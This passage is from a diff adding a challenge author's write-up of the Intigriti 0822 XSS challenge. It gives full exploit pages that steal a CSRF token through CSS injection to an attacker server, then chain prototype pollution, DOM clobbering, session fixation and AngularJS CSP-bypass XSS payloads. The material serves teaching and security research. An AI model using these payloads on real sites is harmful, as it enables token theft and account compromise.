+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"match"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"dark"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string-property property">"light"</span><span class="token operator">:</span><span class="token string">"1"</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now, <code>document.domain.match(/testing/)</code> returns <code>&quot;1&quot;</code> which is truthy and <code>timeout</code> is <code>9999</code>, we can finally exploit CSS injection and steal the CSRF token.</p>
+<p>Part1 is about steal CSRF token to perform CSRF, part2 is about exploit nested parser vulnerability and find a CSP bypass to perform XSS.</p>
+<p>After finished both parts, we can build our full exploit script.</p>
+<h2><span id="full-exploit">Full Exploit</span></h2><ol>
+<li>Login with the name <code>&quot;&gt;&lt;img name=domain&gt;</code> to do DOM clobbering</li>
+<li>Update theme to do prototype pollution</li>
+<li>Get CSRF token via CSS injection</li>
+<li>CSRF to submit the payload which leverage nested parser XSS + CSP bypass via AngularJS</li>
+<li>Pop up the alert</li>
+</ol>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>robots<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noindex<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>click me to start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>themeForm</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>newWindow<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/plain<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&#123;"__proto__":&#123;"timeout":&#123;"dark":"99999","light":"99999"&#125;,"match":&#123;"drak":"1","light":"1"&#125;&#125;,"primary":&#123;"text":&#123;"dark":"#fff","light":"#fff"&#125;,"bg":&#123;"dark":"#fff","light":"#fff"&#125;&#125;,"secondary":&#123;"text":&#123;"dark":"#fff","light":"#fff"&#125;,"bg":&#123;"dark":"#fff","light":"#fff","padding":"<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>&#125;&#125;&#125;<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>previewForm</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>newWindow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>desc<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XSS<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> baseUrl <span class="token operator">=</span> <span class="token string">'https://challenge-0822.intigriti.io/challenge'</span>
+    <span class="token comment">// you need to prepare a server to steal csrf token</span>
+    <span class="token keyword">const</span> cssInjectionServerUrl <span class="token operator">=</span> <span class="token string">'http://localhost:5100'</span>
+    <span class="token keyword">let</span> win
+    <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// Step1. login</span>
+      <span class="token comment">// Step2. DOM clobbering `document.domain`</span>
+      <span class="token keyword">let</span> payload <span class="token operator">=</span> <span class="token string">'">&lt;img name=domain>'</span>
+      win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/login.php?name='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'newWindow'</span><span class="token punctuation">)</span>
+
+      <span class="token function">waitForWindowLoaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">waitForWindowLoaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// if we can access win.origin, it means that the location haven't changed</span>
+        win<span class="token punctuation">.</span>origin
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">waitForWindowLoaded</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// window loaded</span>
+        <span class="token comment">// Step3. update theme to do prototype pollution</span>
+        themeForm<span class="token punctuation">.</span>action <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">'/theme.php'</span>
+        themeForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span>getCsrfToken<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">getCsrfToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// Step4: Get CSRF token via CSS injection</span>
+      <span class="token keyword">const</span> id <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      <span class="token function">fetch</span><span class="token punctuation">(</span>cssInjectionServerUrl <span class="token operator">+</span> <span class="token string">'/result?id='</span><span class="token operator">+</span>id<span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          <span class="token function">doXSS</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+      <span class="token keyword">const</span> cssInjectionPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Please wait for a few seconds
+        &lt;style>
+          @import url('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssInjectionServerUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/start?id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;len=32')
+        &lt;/style></span><span class="token template-punctuation string">`</span></span>
+      win<span class="token punctuation">.</span>location <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">'/app.php#msg='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>cssInjectionPayload<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">doXSS</span><span class="token punctuation">(</span><span class="token parameter">csrfToken</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// Step5: Nested Parser XSS + CSP bypass via AngularJS</span>
+      <span class="token keyword">let</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://www.youtube.com/embed/srcdoc=&lt;script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js">&lt;\/script>&lt;script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js">&lt;\/script>&lt;div/ng-app/ng-csp>&#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;&lt;/div>.png
+</span><span class="token template-punctuation string">`</span></span>
+      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#previewForm input[name=desc]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> xssPayload<span class="token punctuation">)</span>
+      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#previewForm input[name=csrf-token]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> csrfToken<span class="token punctuation">)</span>
+      previewForm<span class="token punctuation">.</span>action <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">'/preview.php'</span>
+      previewForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Here is a working PoC: <a target="_blank" rel="noopener" href="https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html">https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html</a></p>
+<p>But the css injection server is a bit buggy, and I have no plan to maintain it, so I will shutdown the server in a week.</p>
+<h2><span id="bonus">Bonus</span></h2><p>Besides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it.</p>
+<p>Since we have control over other sub domains, for example, <code>challenge-0422.intigriti.io</code>, we can use session fixation to fix session id and CSRF token.</p>
+<ol>
+<li>Get a session id and CSRF token from server, assumed it’s <code>sid123</code> and <code>token123</code></li>
+<li>Run <code>document.cookie=&quot;PHPSESSID=sid123;Domain=intigriti.io;Max-Age=10;Secure&quot;;</code> in subdomain</li>
+<li>Do CSRF with CSRF token: <code>token123</code></li>
+</ol>
+<p>PoC:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>robots<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noindex<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>click me to start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>previewForm</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>desc<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XSS<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> baseUrl <span class="token operator">=</span> <span class="token string">'https://challenge-0822.intigriti.io/challenge'</span>
+    
+    <span class="token comment">// get a pair of seesion id and csrf token first</span>
+    <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token string">'8341g3mkhlpojfup4k6keu3uls'</span>
+    <span class="token keyword">const</span> token <span class="token operator">=</span> <span class="token string">'2d414a262b5b02643a364a23a5f67dd7'</span>
+
+    <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+         window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&amp;first=1#%0adocument.cookie='PHPSESSID=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>sid<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;Domain=intigriti.io;Max-Age=10;Secure;'</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">)</span>
+
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          <span class="token function">doXSS</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+   
+
+    <span class="token keyword">function</span> <span class="token function">doXSS</span><span class="token punctuation">(</span><span class="token parameter">csrfToken</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">let</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://www.youtube.com/embed/srcdoc=&lt;script/src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js">&lt;\/script>&lt;script/src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js">&lt;\/script>&lt;div/ng-app/ng-csp>&#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;&lt;/div>.png
+</span><span class="token template-punctuation string">`</span></span>
+      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#previewForm input[name=desc]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> xssPayload<span class="token punctuation">)</span>
+      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#previewForm input[name=csrf-token]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'value'</span><span class="token punctuation">,</span> csrfToken<span class="token punctuation">)</span>
+      previewForm<span class="token punctuation">.</span>action <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">'/preview.php'</span>
+      previewForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain.</p>
+<h2><span id="another-bypass-with-angularjs-only">Another bypass with AngularJS only</span></h2><p><a target="_blank" rel="noopener" href="https://twitter.com/kinugawamasato/status/1565146690470162432">@kinugawamasato</a> found another very coll way for the CSP bypass without any other library, here is the payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;srcdoc&#x3D;
+&lt;script&#x2F;src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.0.1&#x2F;angular.js&gt;&lt;&#x2F;script&gt;
+&lt;iframe&#x2F;ng-app&#x2F;ng-csp&#x2F;srcdoc&#x3D;&quot;
+  &lt;script&#x2F;src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.8.0&#x2F;angular.js&gt;
+  &lt;&#x2F;script&gt;
+  &lt;img&#x2F;ng-app&#x2F;ng-csp&#x2F;src&#x2F;ng-o&#123;&#123;&#125;&#125;n-error&#x3D;$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)&gt;&quot;
+&gt;&lt;&#x2F;iframe&gt;.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It uses nested AngularJS expression to bypass <code>on</code> keyword, and also use <code>$event.target.ownerDocument.defaultView</code> to access window, brilliant!</p>
+<h2><span id="credits">Credits</span></h2><p>Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.</p>
+<p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/Psych0tr1a">@Psych0tr1a</a> for his nested parser XSS research: <a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/">Fuzzing for XSS via nested parsers condition</a></p>
+<p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/Strellic_">@Strellic_</a> for his idea of chaining DOM clobbering and prototype pollution and share the writeup: <a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/UNI-CTF-21-complex-web-exploit-chain-0day-bypass-impossible-CSP">UNI CTF 2021: A Complex Web Exploit Chain &amp; a 0day to Bypass an Impossible CSP</a></p>
+<p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/tehjh">@tehjh</a> for his amazing <a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22#191-bytes">CSP bypass via Angular</a></p>
+<p>We hope you like the challenge and learn a lot of new things, see you next time!</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/09/01/en/angularjs-csp-bypass-cdnjs/">Who pollutes your prototype? Find the libs on cdnjs in an automated way</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022 writeup - modernblog</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/08/29/intigriti-0822-xss-author-writeup/" class="dropdown-item">
